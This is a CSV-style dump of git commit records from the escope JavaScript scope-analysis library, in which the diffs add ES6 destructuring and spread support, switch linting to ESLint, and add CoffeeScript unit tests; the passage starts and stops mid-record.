                  node: node<c><\n>-                            index: i<\n>-                        });<\n>-                    }<\n>-                    break;<\n>-                        currentScope.__define(node.params[i]<c> {<\n>-                            type: Variable.Parameter<c><\n>-                            name: node.params[i]<c><\n>-                            node: node<c><\n>-                            index: i<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,4,18,20 Nov 2014,Only use ESLint,0,0,2,9,359,+        'no-loop-func': 0<\n>+    .pipe(eslint.formatEach('stylish'<c> process.stderr))<\n>,"-jshint = require 'gulp-jshint'<\n>-    .pipe(jshint('.jshintrc'))<\n>-    .pipe(jshint.reporter(require('jshint-stylish')))<\n>-    .pipe(jshint.reporter('fail'))<\n>-    .pipe(eslint.formatEach('compact'<c> process.stderr))<\n>-    ""gulp-jshint"": ""~1.9.0""<c><\n>-    ""jshint-stylish"": ""^1.0.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,44,20 Nov 2014,Destructuring assignments in AssignmentExpression ref #33,0,0,2,345,15926,"+        var i<c> iz<c> ref<c> current<c> implicit<c> info;<\n>+                info = implicit[i];<\n>+                this.__defineImplicit(info.pattern<c> {<\n>+                    name: info.pattern<c><\n>+                    node: info.node<\n>+    function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>+        estraverse.traverse(rootPattern<c> {<\n>+                            callback(pattern<c> true);<\n>+                            callback(pattern.argument<c> false);<\n>+                                callback(property.key<c> false);<\n>+                                callback(property.value<c> false);<\n>+                                callback(element<c> false);<\n>+    function doVariableDeclaration(variableTargetScope<c> node<c> index) {<\n>+        var decl<c> init;<\n>+        decl = node.declarations[index];<\n>+        init = decl.init;<\n>+        // FIXME: Don't consider initializer with complex patterns.<\n>+        // Such as<c><\n>+        // var [a<c> b<c> c = 20] = array;<\n>+        traverseIdentifierInPattern(decl.id<c> function (pattern<c> toplevel) {<\n>+            variableTargetScope.__define(pattern<c> {<\n>+                type: Variable.Variable<c><\n>+                name: pattern<c><\n>+                node: decl<c><\n>+                index: index<c><\n>+                kind: node.kind<c><\n>+                parent: node<\n>+            });<\n>+            if (init) {<\n>+                currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+            }<\n>+        });<\n>+    }<\n>+                        traverseIdentifierInPattern(node.left<c> function (pattern<c> toplevel) {<\n>+                            var maybeImplicitGlobal = null;<\n>+                            if (!currentScope.isStrict) {<\n>+                                maybeImplicitGlobal = {<\n>+                                    pattern: pattern<c><\n>+                                    node: node<\n>+                                };<\n>+                            }<\n>+                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                        });<\n>+                        traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                        });<\n>+                        traverseIdentifierInPattern(node.left<c> function (pattern) {<\n>+                            var maybeImplicitGlobal = null;<\n>+                            if (!currentScope.isStrict) {<\n>+                                maybeImplicitGlobal = {<\n>+                                    pattern: pattern<c><\n>+                                    node: node<\n>+                                };<\n>+                            }<\n>+                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+                        });<\n>+    it 'Pattern in var in ForInStatement'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            for (var [a<c> b<c> c] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'c'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+    it 'ArrayPattern in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            [a<c> b<c> c] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 4<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'a'<\n>+            'b'<\n>+            'c'<\n>+            'array'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.null<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.null<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+    it 'SpreadElement in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            [a<c> b<c> ...rest] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 4<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'a'<\n>+            'b'<\n>+            'rest'<\n>+            'array'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.null<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'rest'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.null<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            [a<c> b<c> ...[c<c> d<c> ...rest]] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 6<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'a'<\n>+            'b'<\n>+            'c'<\n>+            'd'<\n>+            'rest'<\n>+            'array'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 6<\n>+        for name<c> index in [<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'rest'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+            expect(scope.references[index].isWrite()).to.be.true<\n>+            expect(scope.references[index].partial).to.be.true<\n>+            expect(scope.references[index].resolved).to.be.null<\n>+        expect(scope.references[5].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[5].isWrite()).to.be.false<\n>+    it 'ObjectPattern in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            ({<\n>+                shorthand<c><\n>+                key: value<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            }) = object;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 4<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'shorthand'<\n>+            'value'<\n>+            'world'<\n>+            'object'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'shorthand'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'value'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.null<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'world'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.null<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'object'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+    it 'complex pattern in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            ({<\n>+                shorthand<c><\n>+                key: [ a<c> b<c> c<c> d<c> e ]<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            }) = object;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 8<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'shorthand'<\n>+            'a'<\n>+            'b'<\n>+            'c'<\n>+            'd'<\n>+            'e'<\n>+            'world'<\n>+            'object'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 8<\n>+        for name<c> index in [<\n>+                'shorthand'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'e'<\n>+                'world'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+            expect(scope.references[index].isWrite()).to.be.true<\n>+            expect(scope.references[index].partial).to.be.true<\n>+        expect(scope.references[7].identifier.name).to.be.equal 'object'<\n>+        expect(scope.references[7].isWrite()).to.be.false<\n>",-        /**<\n>-         * If reference may become implicit global variable definition<c><\n>-         * this is the tree being written to it.<\n>-         * @member {esprima#Node} Reference#__maybeImplicitGlobal<\n>-         * @private<\n>-         */<\n>-        var i<c> iz<c> ref<c> current<c> node<c> implicit;<\n>-                node = implicit[i];<\n>-                this.__defineImplicit(node.left<c> {<\n>-                    name: node.left<c><\n>-                    node: node<\n>-    function doVariableDeclaration(variableTargetScope<c> node<c> index) {<\n>-        var decl<c> init;<\n>-        decl = node.declarations[index];<\n>-        init = decl.init;<\n>-        // FIXME: Don't consider initializer with complex patterns.<\n>-        // Such as<c><\n>-        // var [a<c> b<c> c = 20] = array;<\n>-        estraverse.traverse(decl.id<c> {<\n>-                function define(pattern<c> toplevel) {<\n>-                    variableTargetScope.__define(pattern<c> {<\n>-                        type: Variable.Variable<c><\n>-                        name: pattern<c><\n>-                        node: decl<c><\n>-                        index: index<c><\n>-                        kind: node.kind<c><\n>-                        parent: node<\n>-                    });<\n>-                    if (init) {<\n>-                        currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-                    }<\n>-                }<\n>-                            define(pattern<c> true);<\n>-                            return;<\n>-                            define(pattern.argument<c> false);<\n>-                                define(property.key<c> false);<\n>-                                define(property.value<c> false);<\n>-                                define(element<c> false);<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right<c> (!currentScope.isStrict && node.left.name != null) && node);<\n>-                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right<c> (!currentScope.isStrict && node.left.name != null) && node<c> true);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,18,20 Nov 2014,Add SpreadElement in VariableDeclaration ref #33,0,0,2,81,3748,"+                    case Syntax.SpreadElement:<\n>+                        if (pattern.argument.type === Syntax.Identifier) {<\n>+                            define(pattern.argument<c> false);<\n>+                        }<\n>+                        break;<\n>+    it 'SpreadElement in var'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var [a<c> b<c> ...rest] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'rest'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'rest'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var [a<c> b<c> ...[c<c> d<c> ...rest]] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 6<\n>+        for name<c> index in [<\n>+                'arguments'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'rest'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.be.equal name<\n>+        expect(scope.references).to.have.length 6<\n>+        for name<c> index in [<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'rest'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+            expect(scope.references[index].isWrite()).to.be.true<\n>+            expect(scope.references[index].partial).to.be.true<\n>+        expect(scope.references[5].identifier.name).to.be.equal 'array'<\n>+        expect(scope.references[5].isWrite()).to.be.false<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,12,20 Nov 2014,Add ObjectPattern support in VariableDeclaration ref #33,0,0,2,116,5148,"+                var i<c> iz<c> element<c> property;<\n>+                        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>+                            property = pattern.properties[i];<\n>+                            if (property.shorthand) {<\n>+                                define(property.key<c> false);<\n>+                                continue;<\n>+                            }<\n>+                            if (property.value.type === Syntax.Identifier) {<\n>+                                define(property.value<c> false);<\n>+                                continue;<\n>+                            }<\n>+                        }<\n>+                        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+                            element = pattern.elements[i];<\n>+                            if (element && element.type === Syntax.Identifier) {<\n>+                                define(element<c> false);<\n>+                            }<\n>+                        }<\n>+    it 'ObjectPattern in var'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var {<\n>+                shorthand<c><\n>+                key: value<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            } = object;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'object'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'shorthand'<\n>+        expect(scope.variables[2].name).to.be.equal 'value'<\n>+        expect(scope.variables[3].name).to.be.equal 'world'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'shorthand'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'value'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'world'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'object'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+    it 'complex pattern in var'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var {<\n>+                shorthand<c><\n>+                key: [ a<c> b<c> c<c> d<c> e ]<c><\n>+                hello: {<\n>+                    world<\n>+                }<\n>+            } = object;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'object'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 8<\n>+        for name<c> index in [<\n>+                'arguments'<\n>+                'shorthand'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'e'<\n>+                'world'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.be.equal name<\n>+        expect(scope.references).to.have.length 8<\n>+        for name<c> index in [<\n>+                'shorthand'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'e'<\n>+                'world'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+            expect(scope.references[index].isWrite()).to.be.true<\n>+            expect(scope.references[index].partial).to.be.true<\n>+        expect(scope.references[7].identifier.name).to.be.equal 'object'<\n>+        expect(scope.references[7].isWrite()).to.be.false<\n>",-                        // Identifiers inside ArrayPattern.<\n>-                        if (parent.type === Syntax.ArrayPattern) {<\n>-                            define(pattern<c> false);<\n>-                            return;<\n>-                        }<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,6,20 Nov 2014,Update dependencies,0,0,1,6,176,"+    ""estraverse"": "">=1.8.0""<\n>+    ""gulp-eslint"": ""^0.2.0""<c><\n>+    ""gulp-mocha"": ""~2.0.0""<c><\n>","-    ""estraverse"": "">=1.7.1""<\n>-    ""gulp-eslint"": ""^0.1.8""<c><\n>-    ""gulp-mocha"": ""~1.1.1""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,2,44,20 Nov 2014,Add ArrayPattern in VariableDeclaration ref #33,0,1,1,158,8444,"+    function Reference(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+            /**<\n>+             * Whether the Reference might refer to a partial value of writeExpr.<\n>+             * @member {boolean} Reference#partial<\n>+             */<\n>+            this.partial = partial;<\n>+         * If reference may become implicit global variable definition<c><\n>+         * this is the tree being written to it.<\n>+         * @member {esprima#Node} Reference#__maybeImplicitGlobal<\n>+    Reference.RW = Reference.READ | Reference.WRITE;<\n>+        return !!(this.flag & Reference.WRITE);<\n>+        return !!(this.flag & Reference.READ);<\n>+                variables: []<c><\n>+                /**<\n>+                * List of {@link Reference}s that are left to be resolved (i.e. which<\n>+                * need to be linked to the variable they refer to).<\n>+                * @member {Reference[]} Scope#implicit#left<\n>+                */<\n>+                left: []<\n>+            this.implicit.left = this.__left;<\n>+    Scope.prototype.__referencing = function __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+            ref = new Reference(node<c> this<c> assign || Reference.READ<c> writeExpr<c> maybeImplicitGlobal<c> !!partial);<\n>+    function doVariableDeclaration(variableTargetScope<c> node<c> index) {<\n>+        var decl<c> init;<\n>+        decl = node.declarations[index];<\n>+        init = decl.init;<\n>+        // FIXME: Don't consider initializer with complex patterns.<\n>+        // Such as<c><\n>+        // var [a<c> b<c> c = 20] = array;<\n>+        estraverse.traverse(decl.id<c> {<\n>+            enter: function (pattern<c> parent) {<\n>+                function define(pattern<c> toplevel) {<\n>+                    variableTargetScope.__define(pattern<c> {<\n>+                        type: Variable.Variable<c><\n>+                        name: pattern<c><\n>+                        node: decl<c><\n>+                        index: index<c><\n>+                        kind: node.kind<c><\n>+                        parent: node<\n>+                    });<\n>+                    if (init) {<\n>+                        currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+                    }<\n>+                }<\n>+                switch (pattern.type) {<\n>+                    case Syntax.Identifier:<\n>+                        // Toplevel identifier.<\n>+                        if (parent === null) {<\n>+                            define(pattern<c> true);<\n>+                            return;<\n>+                        }<\n>+                        // Identifiers inside ArrayPattern.<\n>+                        if (parent.type === Syntax.ArrayPattern) {<\n>+                            define(pattern<c> false);<\n>+                            return;<\n>+                        }<\n>+                        break;<\n>+                    case Syntax.ObjectPattern:<\n>+                        break;<\n>+                    case Syntax.ArrayPattern:<\n>+                        break;<\n>+                }<\n>+            }<\n>+        });<\n>+    }<\n>+        var resultScopes<c> scopeManager;<\n>+                var i<c> iz<c> decl<c> variableTargetScope<c> classOuterScope;<\n>+                        currentScope.__referencing(node.left.declarations[0].id<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                        currentScope.__referencing(node.left<c> Reference.WRITE<c> node.right<c> (!currentScope.isStrict && node.left.name != null) && node<c> true);<\n>+                        doVariableDeclaration(variableTargetScope<c> node<c> i);<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 destructuring assignments'<c> -><\n>+    it 'ArrayPattern in var'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var [a<c> b<c> c] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'a'<\n>+        expect(scope.variables[2].name).to.be.equal 'b'<\n>+        expect(scope.variables[3].name).to.be.equal 'c'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>+        